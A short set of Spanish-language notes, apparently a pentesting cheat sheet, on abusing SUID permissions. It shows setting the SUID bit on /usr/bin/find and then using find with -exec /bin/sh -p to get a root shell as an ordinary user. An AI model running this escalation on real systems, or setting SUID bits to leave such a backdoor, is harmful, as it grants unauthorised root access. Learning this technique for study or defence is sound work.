# Explotacion de permisos SUID
\[GTFOBins]\(https://gtfobins.github.io/\) |

* Agregarle los permiso SUID a un comando
  ```bash
    chmod 4755 /usr/bin/find
  ```

Los permiso SUID nos permite ejecutar cualquier binario como si fueramos el propietario de forma temporal 

```bash
[root@user]# su pepito
[pepito@user]$ find . -exec /bin/sh -p \; -quit
sh-5.1# whoami
root
sh-5.1#
```
